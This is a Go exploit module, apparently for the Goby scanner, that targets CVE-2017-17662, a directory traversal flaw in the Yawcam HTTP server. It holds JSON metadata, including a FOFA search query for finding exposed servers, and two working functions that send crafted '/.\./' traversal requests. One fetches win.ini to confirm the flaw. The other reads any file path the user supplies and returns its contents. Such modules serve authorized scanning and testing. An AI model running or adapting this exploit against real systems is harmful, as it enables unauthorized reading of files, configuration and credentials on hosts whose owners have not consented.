package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yawcam HTTP Server Path Traversal Vulnerability (CVE-2017-17662)",
    "Description": "<p>Yawcam is a set of video editing management software based on Windows platform. HTTP server is one of the HTTP servers.</p><p>A directory traversal vulnerability exists in the HTTP server from Yawcam versions 0.2.6 to 0.6.0. A remote attacker can exploit this vulnerability to read arbitrary files with the help of the '.x./' or '....\\x/' sequence.</p>",
    "Impact": "Yawcam HTTP Server Path Traversal Vulnerability (CVE-2017-17662)",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"http://www.yawcam.com/news.php\">http://www.yawcam.com/news.php</a></p>",
    "Product": "Yawcam",
    "VulType": [
        "File Inclusion"
    ],
    "Tags": [
        "File Inclusion"
    ],
    "Translation": {
        "CN": {
            "Name": "Yawcam HTTP服务器路径遍历漏洞 (CVE-2017-17662)",
            "Description": "<p>Yawcam是一套基于Windows平台的视频编辑管理软件。HTTP server是其中的一个HTTP服务器。</p><p>Yawcam 0.2.6版本至0.6.0版本中的HTTP服务器存在目录遍历漏洞。远程攻击者可借助‘.x./’或‘....＼x/’序列利用该漏洞读取任意文件。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a href=\"http://www.yawcam.com/news.php\">http://www.yawcam.com/news.php</a></p>",
            "Product": "Yawcam",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "Yawcam HTTP Server Path Traversal Vulnerability (CVE-2017-17662)",
            "Description": "<p>Yawcam is a set of video editing management software based on Windows platform. HTTP server is one of the HTTP servers.</p><p>A directory traversal vulnerability exists in the HTTP server from Yawcam versions 0.2.6 to 0.6.0. A remote attacker can exploit this vulnerability to read arbitrary files with the help of the '.x./' or '....\\x/' sequence.</p>",
            "Impact": "Yawcam HTTP Server Path Traversal Vulnerability (CVE-2017-17662)",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"http://www.yawcam.com/news.php\">http://www.yawcam.com/news.php</a></p>",
            "Product": "Yawcam",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "FofaQuery": "banner=\"yawcam\" || header=\"yawcam\" || body=\"_yawcam_computer_address:port\"",
    "GobyQuery": "banner=\"yawcam\" || header=\"yawcam\" || body=\"_yawcam_computer_address:port\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "http://www.yawcam.com",
    "DisclosureDate": "2018-01-11",
    "References": [
        "http://packetstormsecurity.com/files/145770/Yawcam-0.6.0-Directory-Traversal.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2017-17662"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201801-372"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "/windows/win.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10670"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := `/.\./.\./.\./.\./.\./.\./.\./windows/win.ini`
			conn, err := httpclient.GetTCPConn(u.HostInfo, time.Second*15)
			if err != nil {
				return false
			}
			defer conn.Close()
			msg := fmt.Sprintf("GET %s HTTP/1.1\r\n", uri)
			msg += fmt.Sprintf("Host: %s\r\n", u.HostInfo)
			msg += "Connection:close\r\n"
			msg += "User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\r\n"
			msg += "\r\n\r\n"
			_, err = conn.Write([]byte(msg))
			buf := make([]byte, 4096)
			resp := ""
			for {
				count, err := conn.Read(buf)
				tmpMsg := string(buf[0:count])
				resp += tmpMsg
				if err != nil {
					break
				}
			}
			if strings.Contains(resp, "for 16-bit app support") && strings.Contains(resp, "[extensions]") && strings.Contains(resp, "200 OK") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			host := fmt.Sprintf("%s:%s", expResult.HostInfo.IP, expResult.HostInfo.Port)
			uri := "/.\\./.\\./.\\./.\\./.\\./.\\./.\\."
			cmd := ss.Params["file"].(string)
			path := uri + cmd
			conn, err := httpclient.GetTCPConn(host, time.Second*15)
			if err != nil {
				expResult.Success = false
			}
			defer conn.Close()
			msg := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
			msg += fmt.Sprintf("Host: %s\r\n", host)
			msg += "Connection:close\r\n"
			msg += "User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\r\n"
			msg += "\r\n\r\n"
			_, err = conn.Write([]byte(msg))
			buf := make([]byte, 4096)
			resp := ""
			for {
				count, err := conn.Read(buf)
				tmpMsg := string(buf[0:count])
				resp += tmpMsg
				if err != nil {
					break
				}
			}
			if strings.Contains(resp, "200 OK") {
				expResult.Success = true
				expResult.Output = resp
			}
			return expResult
		},
	))
}
